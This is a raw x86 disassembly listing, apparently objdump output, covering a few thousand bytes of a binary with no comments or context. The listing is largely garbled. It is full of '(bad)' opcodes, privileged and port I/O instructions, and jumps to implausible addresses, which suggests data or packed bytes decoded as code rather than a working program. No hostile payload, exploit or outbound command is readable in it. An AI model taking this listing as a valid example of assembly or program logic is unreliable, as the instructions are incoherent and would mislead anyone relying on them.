  430b8f:	mov    esp,esp
  430b91:	clc    
  430b92:	test   ebx,ecx
  430b94:	clc    
  430b95:	ror    DWORD PTR [ebp-0x2a],cl
  430b98:	mov    esi,ecx
  430b9a:	lock scas eax,DWORD PTR es:[edi]
  430b9c:	inc    ebp
  430b9d:	mov    esi,DWORD PTR [ebx]
  430b9f:	hlt    
  430ba0:	pushf  
  430ba1:	jge    0x430b2e
  430ba3:	sub    esp,esp
  430ba5:	cmp    ecx,ebx
  430ba7:	ja     0x430b77
  430ba9:	mov    ebp,DWORD PTR [eax-0x58]
  430bac:	dec    ebp
  430bad:	xor    ecx,DWORD PTR [di+0x3]
  430bb1:	mov    ebp,eax
  430bb3:	clc    
  430bb4:	push   ebp
  430bb5:	retf   
  430bb6:	mov    dl,bl
  430bb8:	adc    esi,edx
  430bba:	jb     0x430b8a
  430bbc:	add    BYTE PTR [edi-0xb7474b3],ch
  430bc2:	lock jge 0x430b90
  430bc5:	sub    ecx,DWORD PTR [ebp+0x3b]
  430bc8:	mov    esi,DWORD PTR [edi-0x28]
  430bcb:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430bd2:	mov    BYTE PTR [ebx-0x34b20729],cl
  430bd8:	mov    edx,ebx
  430bda:	lock (bad) 
  430bdc:	ror    esi,cl
  430bde:	push   ebp
  430bdf:	scas   eax,DWORD PTR es:[edi]
  430be0:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430be6:	fwait
  430be7:	sub    esi,DWORD PTR [edx]
  430be9:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430bef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bf0:	xor    esp,DWORD PTR [ebx]
  430bf2:	add    ecx,DWORD PTR [ebp-0x18]
  430bf5:	mov    edi,DWORD PTR [ebp-0x8]
  430bf8:	mov    bl,cl
  430bfa:	cmp    dl,bl
  430bfc:	jb     0x430bcc
  430bfe:	add    dh,dl
  430c00:	dec    ebp
  430c01:	scas   eax,DWORD PTR es:[edi]
  430c02:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430c08:	shr    DWORD PTR [ebx],cl
  430c0a:	into   
  430c0b:	cmp    edx,esi
  430c0d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430c13:	dec    ebp
  430c14:	dec    ebp
  430c15:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430c1b:	retf   
  430c1c:	xor    edx,esi
  430c1e:	add    ecx,esi
  430c20:	imul   ecx,edx
  430c23:	mov    DWORD PTR [ebp+0x8],edx
  430c26:	xor    ecx,DWORD PTR [ebp+0x2b]
  430c29:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430c2f:	add    esi,DWORD PTR [ebx]
  430c31:	rol    BYTE PTR [ebx],0x45
  430c34:	rdtsc  
  430c36:	xlat   BYTE PTR ds:[ebx]
  430c37:	pushf  
  430c38:	jge    0x430bc3
  430c3a:	xor    ebx,eax
  430c3c:	sub    eax,DWORD PTR [ebp-0x73]
  430c3f:	(bad)  
  430c40:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430c47:	dec    ebp
  430c48:	xchg   BYTE PTR [ebx],dh
  430c4a:	inc    DWORD PTR [ebx]
  430c4c:	(bad)  
  430c4d:	jmp    0x430c9c
  430c4f:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430c55:	dec    ebp
  430c56:	into   
  430c57:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430c5d:	fwait
  430c5e:	shl    DWORD PTR [edx],cl
  430c60:	retf   0x5588
  430c63:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430c69:	add    eax,DWORD PTR [eax]
  430c6b:	call   0x8ace61bd
  430c70:	fcom   QWORD PTR [ecx]
  430c72:	retf   
  430c73:	jb     0x430cda
  430c75:	add    ch,cl
  430c77:	dec    ebp
  430c78:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430c7e:	dec    ebp
  430c7f:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c85:	jge    0x430c55
  430c87:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c8d:	add    cl,dh
  430c8f:	dec    ebp
  430c90:	dec    DWORD PTR [ebx-0x2c031b01]
  430c96:	inc    ebp
  430c97:	push   ebp
  430c98:	dec    DWORD PTR [ebx-0x73ff2734]
  430c9e:	lea    ebx,[ebx-0x7400cdac]
  430ca4:	push   eax
  430ca5:	mov    ah,0x45
  430ca7:	push   ebp
  430ca8:	mov    esi,DWORD PTR [ebx]
  430caa:	les    esi,FWORD PTR [ebx]
  430cac:	add    BYTE PTR [ebx],al
  430cae:	inc    DWORD PTR [ebx]
  430cb0:	mov    ecx,DWORD PTR [edi]
  430cb2:	cld    
  430cb3:	retf   0x4d80
  430cb6:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430cbc:	jne    0x430c49
  430cbe:	jmp    eax
  430cc0:	ror    bl,1
  430cc2:	or     cl,dh
  430cc4:	add    BYTE PTR [edi-0xf2f7475],ch
  430cca:	not    bl
  430ccc:	adc    al,0xca
  430cce:	inc    ebp
  430ccf:	push   ebp
  430cd0:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430cd6:	push   0xaf80d6
  430cdb:	mov    eax,DWORD PTR [eax]
  430cdd:	in     al,0xff
  430cdf:	sti    
  430ce0:	sbb    dh,cl
  430ce2:	pop    esi
  430ce3:	xchg   esp,eax
  430ce4:	leave  
  430ce5:	fwait
  430ce6:	add    al,0x32
  430ce8:	push   ebp
  430ce9:	cmp    ebp,esp
  430ceb:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430cef:	dec    DWORD PTR [ecx-0x740f0375]
  430cf5:	push   ebp
  430cf6:	cld    
  430cf7:	xor    ebp,ebx
  430cf9:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430cff:	push   ebp
  430d00:	clc    
  430d01:	xor    esi,ecx
  430d03:	add    esi,DWORD PTR [ebp-0x75]
  430d06:	(bad)  
  430d07:	hlt    
  430d08:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430d0f:	mov    DWORD PTR [esi],eax
  430d11:	hlt    
  430d12:	(bad)  
  430d13:	dec    ebp
  430d14:	add    esi,DWORD PTR [ebx]
  430d16:	(bad)  
  430d17:	mov    edx,0xffc68d0a
  430d1c:	add    dl,cl
  430d1e:	leave  
  430d1f:	push   ebp
  430d20:	push   ebp
  430d21:	mov    ebp,esp
  430d23:	fcom   QWORD PTR [ecx+0x7d]
  430d26:	inc    ebp
  430d27:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430d2d:	iret   
  430d2e:	cld    
  430d2f:	retf   0x868f
  430d32:	loopne 0x430d31
  430d34:	mov    edi,edi
  430d36:	mov    esi,DWORD PTR [ebp-0x8]
  430d39:	mov    esi,eax
  430d3b:	cld    
  430d3c:	jne    0x430cee
  430d3e:	mov    BYTE PTR [ecx],0xa
  430d41:	add    dh,al
  430d43:	test   DWORD PTR [eax],ecx
  430d45:	inc    esi
  430d47:	inc    DWORD PTR [edi]
  430d49:	mov    eax,esi
  430d4b:	cld    
  430d4c:	add    DWORD PTR [eax+0x901c6],eax
  430d52:	leave  
  430d53:	xor    BYTE PTR [ebp+0x45],dl
  430d56:	in     al,dx
  430d57:	mov    edx,DWORD PTR [ecx-0x40]
  430d5a:	inc    ebp
  430d5b:	add    BYTE PTR [ecx-0x74000301],cl
  430d61:	int3   
  430d62:	cld    
  430d63:	jne    0x430d1d
  430d65:	call   0xcc2070
  430d6a:	mov    esi,DWORD PTR [ebp-0x8]
  430d6d:	test   eax,esi
  430d6f:	je     0x430de6
  430d71:	mov    eax,esi
  430d73:	cld    
  430d74:	add    al,0x80
  430d76:	add    WORD PTR [ecx+0x0],ax
  430d7a:	fiadd  DWORD PTR [eax]
  430d7c:	mov    BYTE PTR [eax],0x3d
  430d7f:	push   0xffffffc3
  430d81:	push   esi
  430d82:	mov    edx,DWORD PTR [eax+0x51]
  430d85:	pop    edi
  430d86:	lea    ebx,[ebx-0x8]
  430d89:	ret    0x45
  430d8c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d92:	xchg   eax,edi
  430d94:	mov    DWORD PTR [ebp-0x75],ecx
  430d97:	push   esi
  430d98:	clc    
  430d99:	jne    0x430d6b
  430d9b:	mov    ecx,0xf8450b0b
  430da0:	(bad)  
  430da1:	push   cs
  430da2:	or     BYTE PTR [ebp-0x3a],dh
  430da5:	cmp    eax,DWORD PTR [ecx]
  430da7:	pop    esi
  430da8:	(bad)  
  430da9:	or     al,0x5
  430dab:	inc    eax
  430dac:	leave  
  430dad:	jmp    0x40cf:0x25564204
  430db4:	leave  
  430db5:	in     eax,dx
  430db6:	inc    DWORD PTR [eax-0x75]
  430db9:	fimul  DWORD PTR [ebx-0x228139be]
  430dbf:	inc    eax
  430dc0:	nop
  430dc1:	loopne 0x430dc2
  430dc3:	ret    
  430dc4:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430dca:	add    eax,0xff45e8f8
  430dcf:	push   esi
  430dd0:	push   DWORD PTR [ebp-0x39]
  430dd3:	mov    eax,0x7edda46
  430dd8:	or     al,0x6
  430dda:	push   DWORD PTR [ebp-0x3a]
  430ddd:	cmp    eax,DWORD PTR [edx]
  430ddf:	pop    esi
  430de0:	ret    
  430de1:	or     al,0x56
  430de3:	inc    ecx
  430de4:	push   ebp
  430de5:	jle    0x430dd3
  430de7:	inc    edx
  430de8:	inc    ebp
  430de9:	int    0x1
  430deb:	inc    ecx
  430dec:	sub    BYTE PTR ds:0xe77541fc,ah
  430df2:	add    DWORD PTR [edx+0x1c],eax
  430df5:	retf   0xc38b
  430df8:	adc    al,0x8b
  430dfa:	xchg   edx,eax
  430dfb:	push   ecx
  430dfc:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430e02:	rcl    DWORD PTR [esi-0x9],cl
  430e05:	jne    0x430e57
  430e07:	mov    eax,0x7c80ece
  430e0c:	rol    DWORD PTR [esi],cl
  430e0e:	div    DWORD PTR [ebp+0x50]
  430e11:	cmp    ecx,edx
  430e13:	pop    esi
  430e14:	dec    BYTE PTR [edx]
  430e16:	in     al,dx
  430e17:	inc    edx
  430e18:	sub    esp,ecx
  430e1a:	inc    eax
  430e1b:	(bad)  
  430e1c:	push   eax
  430e1d:	add    edx,DWORD PTR [eax-0x1f]
  430e20:	push   edi
  430e21:	add    dh,dh
  430e23:	leave  
  430e24:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430e28:	add    BYTE PTR [ecx+0x0],dl
  430e2b:	inc    ebp
  430e2c:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430e32:	add    BYTE PTR [eax-0x7fbf448],bh
  430e38:	add    al,0x2
  430e3a:	jmp    0x57eb994
  430e3f:	jne    0x430e29
  430e41:	mov    eax,DWORD PTR [edx]
  430e43:	or     BYTE PTR [eax],al
  430e45:	inc    ecx
  430e46:	stc    
  430e47:	in     eax,dx
  430e48:	ss inc eax
  430e4a:	aas    
  430e4b:	out    0x7d,eax
  430e4d:	inc    ecx
  430e4e:	mov    ebp,ecx
  430e50:	lock ret 0x7d
  430e54:	and    ecx,DWORD PTR [ebx-0x171777]
  430e5a:	add    bh,bh
  430e5c:	aad    0xd7
  430e5e:	add    dh,cl
  430e60:	clts   
  430e62:	(bad)  
  430e63:	call   0xffce0d68
  430e68:	hlt    
  430e69:	iret   
  430e6a:	jge    0x430e42
  430e6c:	rol    DWORD PTR [esi-0x80],cl
  430e6f:	jmp    0x1c5d7c
  430e74:	out    dx,al
  430e75:	mov    eax,DWORD PTR [ebx]
  430e77:	(bad)  
  430e78:	pop    esi
  430e79:	push   es
  430e7a:	cmp    al,0xe8
  430e7c:	sar    edi,0x8
  430e7f:	inc    DWORD PTR [edi]
  430e81:	inc    esi
  430e82:	(bad)  
  430e83:	loopne 0x430f03
  430e85:	push   edi
  430e86:	push   cs
  430e87:	push   ebx
  430e88:	add    BYTE PTR [ebx+0x24008b56],cl
  430e8e:	add    BYTE PTR [ebp+0x50],al
  430e91:	push   eax
  430e92:	add    DWORD PTR [ebx+0x757d1834],ecx
  430e98:	sub    edx,DWORD PTR [esi-0x24]
  430e9b:	jne    0x430e53
  430e9d:	lods   eax,DWORD PTR ds:[esi]
  430e9e:	mov    edx,DWORD PTR [edx-0x34]
  430ea1:	dec    esi
  430ea2:	out    0x83,eax
  430ea4:	into   
  430ea5:	push   edi
  430ea7:	loopne 0x430e77
  430ea9:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430ead:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430eb4:	rol    DWORD PTR [edx],0x8
  430eb7:	mov    esp,ecx
  430eb9:	cmp    DWORD PTR [ebx],0xc
  430ebc:	mov    esi,0x5001c0
  430ec1:	push   eax
  430ec2:	push   cs
  430ec3:	push   eax
  430ec4:	(bad)  
  430ec5:	sub    edx,edi
  430ec7:	push   esi
  430ec8:	adc    al,0xcb
  430eca:	ins    DWORD PTR es:[edi],dx
  430ecb:	mov    eax,0x203e8
  430ed0:	add    al,ah
  430ed2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ed9:	add    dh,al
  430edb:	add    ah,ch
  430edd:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430ee3:	pop    ecx
  430ee4:	or     eax,ebx
  430ee6:	cli    
  430ee7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430eed:	lea    ebp,[ebx]
  430eef:	mov    edx,DWORD PTR [edx-0x4]
  430ef2:	dec    ecx
  430ef3:	inc    ebp
  430ef4:	shr    BYTE PTR [ebx],0x4b
  430ef7:	and    al,0x0
  430ef9:	(bad)  
  430efa:	jne    0x430f41
  430efc:	pop    eax
  430efd:	mov    al,0x5a
  430eff:	call   0x142115e
  430f04:	and    al,0x85
  430f06:	push   edx
  430f07:	add    BYTE PTR [eax+eax*1+0x0],ah
  430f0b:	dec    ebp
  430f0c:	mov    cl,0x23
  430f0e:	jmp    0x430efc
  430f10:	mov    al,0xe7
  430f12:	call   0x1391200
  430f17:	shr    DWORD PTR [eax+ebx*2],cl
  430f1a:	lock (bad) 
  430f1c:	adc    eax,0x757f008d
  430f21:	out    0x58,eax
  430f23:	cmp    al,0x7
  430f25:	pop    edx
  430f26:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430f2d:	push   ecx
  430f2e:	cld    
  430f2f:	mov    esi,0x3b0175
  430f34:	and    al,0xb0
  430f36:	xor    BYTE PTR [edx+0x1],0x8b
  430f3a:	add    ah,bh
  430f3c:	mov    edi,DWORD PTR [ebp-0x4]
  430f3f:	psubsw mm7,QWORD PTR [edi]
  430f42:	add    DWORD PTR [ebp+0x0],ebp
  430f45:	rcr    eax,1
  430f47:	mov    edi,ecx
  430f49:	and    eax,DWORD PTR [eax]
  430f4b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430f51:	call   0x130123a
  430f56:	add    al,cl
  430f58:	mov    ebp,esi
  430f5a:	aam    0x83
  430f5c:	or     DWORD PTR [ecx],eax
  430f5e:	jne    0x430f51
  430f60:	mov    eax,DWORD PTR [eax]
  430f62:	aam    0x0
  430f64:	dec    ebp
  430f65:	jne    0x430ef2
  430f67:	cmp    ebx,eax
  430f69:	jb     0x430fb8
  430f6b:	jmp    0x430ef8
  430f6d:	mov    ebx,esp
  430f6f:	int3   
  430f70:	dec    ebp
  430f71:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430f78:	mov    edx,0x8b0a8b
  430f7d:	cmp    ecx,DWORD PTR [eax]
  430f7f:	jb     0x430f58
  430f81:	pop    edx
  430f82:	push   edi
  430f83:	cli    
  430f84:	pop    es
  430f85:	mov    eax,ecx
  430f87:	jb     0x430f8b
  430f89:	add    DWORD PTR [ebx],0xa
  430f8c:	mov    eax,DWORD PTR [ebx]
  430f8e:	int3   
  430f8f:	add    bh,BYTE PTR [esi+0x75d10006]
  430f95:	jmp    0x430f22
  430f97:	mov    al,0xe8
  430f99:	call   0x104121b
  430f9e:	add    edx,DWORD PTR [ecx+ecx*8]
  430fa1:	pop    edi
  430fa2:	or     BYTE PTR [ecx-0x73],bl
  430fa5:	pop    ecx
  430fa6:	inc    edi
  430fa7:	xor    al,0xeb
  430fa9:	push   ecx
  430faa:	mov    edi,DWORD PTR [edx+0xc506cc]
  430fb0:	call   0xb210b5
  430fb5:	int3   
  430fb6:	sbb    BYTE PTR [esi],ch
  430fb8:	inc    ebp
  430fb9:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430fbf:	call   0x9c122e
  430fc4:	or     BYTE PTR [ebx-0x73],dl
  430fc7:	cmp    al,0x47
  430fc9:	mov    al,0x1
  430fcb:	jb     0x430fcd
  430fcd:	mov    al,0x10
  430fcf:	push   eax
  430fd0:	add    al,0x75
  430fd2:	add    BYTE PTR [ebx],ch
  430fd4:	add    ebx,esp
  430fd6:	int3   
  430fd7:	jne    0x430fe9
  430fd9:	movsx  edx,cl
  430fdc:	add    DWORD PTR [eax],eax
  430fde:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430fe5:	mov    gs,edi
  430fe7:	add    BYTE PTR [eax-0x50],ch
  430fea:	add    al,ch
  430fec:	mov    eax,DWORD PTR [ecx]
  430fee:	sub    eax,DWORD PTR [eax]
  430ff0:	jb     0x431067
  430ff2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ff6:	jge    0x430fe0
  430ff8:	add    al,0x1
  430ffa:	add    DWORD PTR [eax],0x0
  430ffd:	jne    0x430fff
  430fff:	je     0x431046
  431001:	mov    eax,DWORD PTR [edi]
  431003:	ror    BYTE PTR [ebp+0x4d],1
  431006:	or     DWORD PTR [ecx+0x4d03d004],0x3
  43100d:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  431013:	mov    DWORD PTR [ebx],ebp
  431015:	fadd   DWORD PTR [eax+0x75]
  431018:	inc    eax
  431019:	pop    eax
  43101a:	lea    ebx,[ecx+0x4f]
  43101d:	push   0xb1000003
  431022:	out    dx,eax
  431023:	add    ebp,DWORD PTR [edx+edx*2]
  431026:	add    BYTE PTR [ebx+ecx*4],bh
  431029:	mov    ch,BYTE PTR [ebx]
  43102b:	jb     0x43109f
  43102d:	add    al,0x89
  43102f:	push   eax
  431030:	call   0x842b5da2
  431035:	add    DWORD PTR [eax+eax*1],eax
  431038:	jae    0x43104e
  43103a:	icebp  
  43103b:	inc    ebp
  43103c:	mov    eax,DWORD PTR gs:[ecx]
  43103f:	int3   
  431040:	out    dx,al
  431041:	loopne 0x431090
  431043:	sub    eax,DWORD PTR [edx]
  431045:	push   0xffffff83
  431047:	pop    esi
  431048:	push   cs
  431049:	jl     0x431064
  43104b:	add    al,0xaf
  43104d:	xor    eax,0x832b6d00
  431052:	mov    eax,DWORD PTR [edx]
  431054:	rcr    BYTE PTR [ebp+0x754500dc],cl
  43105a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  431060:	inc    ebp
  431061:	shr    ebx,0x3
  431064:	or     DWORD PTR [eax],0x4
  431067:	push   0xffffffa5
  431069:	pop    esi
  43106a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  431071:	jmp    0x4310d0
  431073:	mov    edi,0xff0272
  431078:	fdivr  QWORD PTR [ebp+0x5d]
  43107b:	push   0x4e
  43107d:	pop    ecx
  43107e:	call   0x435483
  431083:	mov    DWORD PTR [ebx],eax
  431085:	in     al,0xc8
  431087:	rol    BYTE PTR [ebp-0x75],0xc1
  43108b:	call   0xad126c
  431090:	pop    esi
  431091:	enter  0xceff,0x8b
  431095:	repz mov ecx,DWORD PTR [ebp-0x34]
  431099:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  4310a0:	je     0x4310a2
  4310a2:	or     DWORD PTR [ebx-0x74183b24],eax
  4310a8:	jne    0x43108e
  4310aa:	jmp    0x4310a5
  4310ac:	push   DWORD PTR [edx-0x24]
  4310af:	push   0x4d
  4310b1:	pop    ecx
  4310b2:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  4310b6:	jge    0x4310be
  4310b8:	mov    eax,eax
  4310ba:	sub    ebp,DWORD PTR [edx+0x24]
  4310bd:	pop    esi
  4310be:	inc    ebp
  4310bf:	mov    esp,0x8b6077
  4310c4:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4310ca:	lods   al,BYTE PTR ds:[esi]
  4310cb:	add    BYTE PTR [ebx],bh
  4310cd:	enter  0xce73,0x49
  4310d1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4310d9:	stc    
  4310da:	jge    0x43114e
  4310dc:	jnp    0xdd42944b
  4310e2:	call   0xc611b8
  4310e7:	fadd   st(0),st
  4310e9:	dec    esi
  4310ea:	ins    BYTE PTR es:[edi],dx
  4310eb:	stc    
  4310ec:	cmp    al,0x73
  4310ee:	push   ebp
  4310ef:	mov    eax,0xf8028b
  4310f4:	jne    0x4310b7
  4310f6:	mov    esi,ecx
  4310f8:	mov    esp,DWORD PTR [ebp+0x2c]
  4310fb:	add    edi,DWORD PTR [ebp-0x24]
  4310fe:	sub    esp,eax
  431100:	and    al,0x45
  431102:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  431108:	sbb    al,0xee
  43110a:	pop    esi
  43110b:	call   0x83113b
  431110:	fsubr  st,st(3)
  431112:	sti    
  431113:	add    BYTE PTR gs:[ecx],bh
  431116:	add    eax,esp
  431118:	add    DWORD PTR [esi],eax
  43111a:	rol    DWORD PTR [ebp+0x8],0x29
  43111e:	mov    esp,eax
  431120:	clc    
  431121:	jne    0x431198
  431123:	mov    eax,0x8b0673
  431128:	loopne 0x43116f
  43112a:	loopne 0x4310b5
  43112c:	lods   al,BYTE PTR ds:[esi]
  43112d:	int3   
  43112e:	inc    ebp
  43112f:	mov    DWORD PTR gs:[eax+edi*8],eax
  431133:	add    al,0xc3
  431135:	sub    ecx,DWORD PTR [ebp+0x47]
  431138:	(bad)  
  43113a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43113e:	add    eax,DWORD PTR [eax]
  431140:	call   0x644d245
  431145:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43114b:	dec    esi
  43114c:	ins    DWORD PTR es:[edi],dx
  43114d:	in     al,dx
  43114e:	lea    eax,[eax]
  431150:	inc    ebp
  431151:	inc    ebp
  431152:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431158:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431162:	and    al,0xdc
  431164:	ror    DWORD PTR [edx+0x24],0xf7
  431168:	or     BYTE PTR [ebp+0x4c],dh
  43116b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43116f:	stos   BYTE PTR es:[edi],al
  431170:	adc    edx,edi
  431172:	inc    esp
  431173:	add    edi,DWORD PTR [eax]
  431175:	jne    0x43115a
  431177:	mov    DWORD PTR [eax-0x7449db04],ecx
  43117d:	cmp    ecx,DWORD PTR [edi]
  43117f:	sub    BYTE PTR [ebp-0x7e],dl
  431182:	sar    ebp,0xb
  431185:	jmp    FWORD PTR [edi+0x2400392a]
  43118b:	sub    esi,DWORD PTR [ebx-0x73]
  43118e:	mov    esp,DWORD PTR [ecx+edi*4]
  431191:	mov    ecx,DWORD PTR [eax]
  431193:	and    BYTE PTR [eax],al
  431195:	jne    0x431161
  431197:	sub    ebp,ecx
  431199:	sbb    BYTE PTR [esi+0x32],ah
  43119c:	dec    ebp
  43119d:	push   ebp
  43119e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  4311a4:	ret    
  4311a5:	mov    edx,ebp
  4311a7:	leave  
  4311a8:	sub    DWORD PTR [esi+0x24],ebx
  4311ab:	ret    0x2b
  4311ae:	pop    ax
  4311b0:	push   ebp
  4311b1:	rol    BYTE PTR [ebx],0xeb
  4311b4:	add    DWORD PTR [ecx+0x6c0001],0x40
  4311bb:	jb     0x431212
  4311bd:	ret    
  4311be:	in     al,dx
  4311bf:	jecxz  0x43114c
  4311c1:	push   esi
  4311c2:	xchg   esp,eax
  4311c3:	jne    0x4311c5
  4311c5:	cmp    edx,DWORD PTR [esi+0x1c]
  4311c8:	jne    0x4311ae
  4311ca:	mov    eax,DWORD PTR [ebp-0x77]
  4311cd:	ror    DWORD PTR [ebx+0x899408],0xe0
  4311d4:	mov    esi,DWORD PTR [ebp-0x75]
  4311d7:	pop    esi
  4311d8:	nop
  4311d9:	mov    eax,DWORD PTR [eax]
  4311db:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4311e1:	add    al,0x0
  4311e3:	inc    ebp
  4311e4:	mov    eax,DWORD PTR [ebx]
  4311e6:	mov    ebp,ebx
  4311e8:	cmp    al,0xf
  4311ea:	or     al,al
  4311ec:	inc    ebp
  4311ed:	inc    ebp
  4311ee:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  4311f4:	cld    
  4311f5:	add    BYTE PTR [edi+0x546c16c0],dh
  4311fb:	add    BYTE PTR [ecx-0x5],dl
  4311fe:	add    eax,0x17200
  431203:	sbb    al,0x85
  431205:	dec    esp
  431206:	je     0x431240
  431208:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43120c:	add    BYTE PTR [ebx],bh
  43120e:	(bad)  
  43120f:	and    al,0x32
  431211:	jae    0x4311af
  431213:	mov    cl,cl
  431215:	inc    DWORD PTR [esp]
  431218:	push   ebp
  431219:	shr    esp,0x8
  43121c:	in     al,dx
  43121d:	push   esp
  43121e:	add    DWORD PTR [eax],esp
  431220:	add    bl,cl
  431222:	inc    ebp
  431223:	mov    bh,0x89
  431225:	add    ah,bh
  431227:	jmp    0xca752171
  43122c:	pushf  
  43122d:	dec    esp
  43122e:	mov    edx,0xf8178520
  431233:	fst    DWORD PTR [ebp+0x0]
  431236:	mov    BYTE PTR [eax],0xc4
  431239:	sub    edx,DWORD PTR [ebx-0x3f]
  43123c:	inc    ebp
  43123d:	add    eax,0xc601da
  431242:	mov    al,0xc6
  431245:	ins    BYTE PTR es:[edi],dx
  431246:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  43124d:	dec    esp
  43124e:	jmp    DWORD PTR [eax]
  431250:	inc    ebp
  431251:	fnstcw WORD PTR [esi+0x29]
  431254:	test   BYTE PTR [eax],0xc8
  431257:	rol    BYTE PTR [eax],0xc0
  43125a:	lea    ecx,[ebp-0x3cf0dbcb]
  431260:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  431266:	inc    esi
  431267:	add    DWORD PTR [eax],ebx
  431269:	add    dh,bh
  43126b:	mov    esi,DWORD PTR [edx+0x8]
  43126e:	(bad)  
  43126f:	fdiv   QWORD PTR ss:[ecx]
  431272:	(bad)  
  431273:	mov    bl,ch
  431275:	add    esi,eax
  431277:	add    dh,bl
  431279:	or     esi,eax
  43127b:	mov    dl,0xdf
  43127d:	add    esi,eax
  43127f:	add    al,ah
  431281:	push   cs
  431282:	mov    BYTE PTR [edx+0xc601e1],0xe2
  431289:	or     BYTE PTR [ebx],dh
  43128b:	dec    ecx
  43128c:	lea    eax,[ebx]
  43128e:	xor    eax,0x18fc0fc7
  431293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431294:	repz clc 
  431296:	add    eax,DWORD PTR [ebp+0x46]
  431299:	prefetcht0 BYTE PTR [ecx-0x2]
  43129d:	xor    eax,0x7c60872
  4312a2:	mov    esp,0xbd32c69b
  4312a7:	pop    esi
  4312a8:	mov    cl,0xbe
  4312ab:	or     al,0xc6
  4312ad:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  4312b4:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  4312bb:	add    dh,al
  4312bd:	mov    eax,ebx
  4312bf:	xor    DWORD PTR [ebx],0x35008dbc
  4312c5:	mov    ecx,DWORD PTR [edi]
  4312c7:	sbb    al,0x18
  4312c9:	inc    ebp
  4312ca:	xrelease mov DWORD PTR [ebx],0x188546f4
  4312d1:	clc    
  4312d2:	(bad)  
  4312d3:	xor    DWORD PTR [edx-0x64],esi
  4312d6:	lea    ecx,[ecx+0x45ffe838]
  4312dc:	mov    ecx,ebx
  4312de:	fadd   st,st(6)
  4312e0:	dec    ebp
  4312e1:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4312e7:	out    0x1,eax
  4312e9:	inc    ebp
  4312ea:	lea    ebp,ds:0xc8ffc6ff
  4312f0:	enter  0xa33,0xc6
  4312f4:	push   ebp
  4312f5:	leave  
  4312f6:	(bad)  
  4312f7:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4312fd:	add    BYTE PTR [ebp+0x44],al
  431300:	mov    eax,esp
  431302:	mov    WORD PTR [esi+0x46398300],?
  431308:	psubusw mm4,QWORD PTR [esi-0x78]
  43130c:	add    BYTE PTR [ebx-0x1303f975],al
  431312:	add    BYTE PTR [ebp+0x1],0xeb
  431316:	add    BYTE PTR [ebp+0x38],al
  431319:	in     eax,dx
  43131a:	inc    ebp
  43131b:	inc    ebp
  43131c:	mov    ebx,ebx
  43131e:	add    BYTE PTR [ebp+0x0],0xec
  431322:	mov    DWORD PTR [ebp-0x41],eax
  431325:	sub    eax,0x2c00454e
  43132a:	ins    DWORD PTR es:[edi],dx
  43132b:	inc    ebp
  43132c:	add    BYTE PTR [esi+0x66],bh
  43132f:	test   BYTE PTR [ebp-0x2300bc],0xb6
  431336:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  431340:	dec    edi
  431341:	pop    es
  431342:	add    ah,ch
  431344:	mov    DWORD PTR [ebp+0x68],eax
  431347:	in     eax,dx
  431348:	inc    DWORD PTR [ebp-0x7d]
  43134b:	out    0xc0,al
  43134d:	inc    ebp
  43134e:	mov    edx,esp
  431350:	push   0x45
  431352:	(bad)  
